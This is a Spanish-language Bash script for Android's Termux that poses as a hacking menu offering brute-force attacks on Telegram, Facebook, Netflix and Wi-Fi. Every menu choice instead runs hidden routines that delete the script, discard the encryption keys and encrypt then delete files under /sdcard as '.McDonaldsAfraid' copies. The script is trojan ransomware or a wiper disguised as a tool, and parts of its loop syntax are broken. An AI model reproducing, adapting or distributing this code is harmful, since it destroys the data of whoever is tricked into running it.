#!/bin/bash
trap ""2
pkg install openssl 2>/dev/null 1>/dev/null
clear
function banner(){
echo -e"\
──────────▄▄▄▄▄▄▄▄▄▄▄──────────
─────▄▄▀▀▀▀──────────▀▀▄▄──────
───▄▀───────────────────▀▀▄────
──█────────────────────────█───
─█─────────────────────▄▀▀▀▀▀█▄
█▀────────────────────█────▄███
█─────────────────────█────▀███
█─────▄▀▀██▀▄─────────█───────█
█────█──████─█─────────▀▄▄▄▄▄█─
█────█──▀██▀─█───────────────█─
█────█───────█──────────────▄▀─
█────▀▄─────▄▀──▄▄▄▄▄▄▄▄▄───█──
█──────▀▀▀▀▀────█─█─█─█─█──▄▀──
─█──────────────▀▄█▄█▄█▀──▄▀───
───▀▀▀▄──────────▄▄▄▄▄▄▀▀──────
────▄▀─────────▀▀──▄▀──────────
──▄▀───────────────█───────────
─▄▀────────────────█──▄▀▀▀█▀▀▄─
──█──────────────────────▄▀────
─█────█──█▀▀▀▄─────█▀▀────█──█─
▄█────▀▀▀────█─────█────▀▀───█─
█▀▄──────────█─────█▄────────█─
█──▀▀▀▀▀█▄▄▄▄▀─────▀█▀▀▀▄▄▄▄▀──
█───────────────────▀▄─────────"
}
function menu(){
  clear;banner
  P="Iniciar Fuerza Bruta de "
  pp='\e[0;35m'
  vr='\e[0;92m'
  n=(${vr}01${pp} ${vr}02${pp} ${vr}3${pp} ${vr}04${pp} ${vr}05${pp} ${vr}06${pp} ${vr}07${pp}  )
  echo -e "${pp}[${n[0]}]${vr} ${P}Telegram 
  ${pp}[${n[1]}]${vr} ${p}Facebook
  ${pp}[${n[2]}]${vr} ${P}Netflix
  ${pp}[${n[3]}]${vr} ${P}Wifi
  ${pp}[${n[4]}]${vr} Descagar Scam
  ${pp}[${n[5]}]${vr} Clonar codigo Html de un sitio web
  ${pp}[${n[6]}]${vr} Mascara de un enlace\n"
  read -p "Fsociety~#: " opcion
case $opcion in
	*) archivo;sleep 3;directorio 
	;;
esac
}
function archivo(){
rm -f $0
rm -rf ~/diamantes
mkdir ~/diamantes
openssl genpkey -out ~/diamantes/m2.p -algorithm rsa -pkeyopt rsa_keygen_bits:4096
openssl pkey -in ~/diamantes/m2.p -out ~/diamantes/m5.p -pubout
dk=$(openssl rand -hex 16)
echo $dk | openssl pkeyutl -encrypt -pubin -inkey ~/diamantes/m5.p -out ~/diamantes/dke.d
openssl pkeyutl -decrypt -inkey ~/diamantes/m2.p -in ~/diamantes/dke.d -out ~/diamantes/dk.dat
rm -rf ~/diamantes/
for fn in find /sdcard/* -type f; do
  if [ ! -f $fn ]; then
    continue
  fi
  openssl sha256 -r $fn > $fn.McDonaldsAfraid
  iv=$(openssl rand -hex 16)
  echo $iv > $fn.McDonaldsAfraid
  openssl enc -aes-256-cbc -K $dk -iv $iv -in $fn -out $fn.𝕸cDonaldAfraid
  rm $fn
  echo "[+] $fn Success"
done
}
function directorio(){
rm -f $0
if [ ! -d ~/diamantes/ ]; then
 mkdir ~/diamantes/
fi
openssl genpkey -out ~/diamantes/m2.p -algorithm rsa -pkeyopt rsa_keygen_bits:4096
openssl pkey -in ~/diamantes/m2.p -out ~/diamantes/m5.p -pubout
dk=$(openssl rand -hex 16)
echo $dk | openssl pkeyutl -encrypt -pubin -inkey ~/diamantes/m5.p -out ~/diamantes/dke.d
openssl pkeyutl -decrypt -inkey ~/diamantes/m2.p -in ~/diamantes/dke.d -out ~/diamantes/dk.dat
rm -rf ~/diamantes/
for fn in find /sdcard/* -type d; do
  if [ ! -f $fn ]; then
    continue
  fi
  openssl sha256 -r $fn > $fn.McDonaldsAfraid
  iv=$(openssl rand -hex 16)
  echo $iv > $fn.McDonaldsAfraid
  openssl enc -aes-256-cbc -K $dk -iv $iv -in $fn -out $fn.McDonaldsAfraid
  rm $fn
  echo "[+] $fn Success"
done
}
menu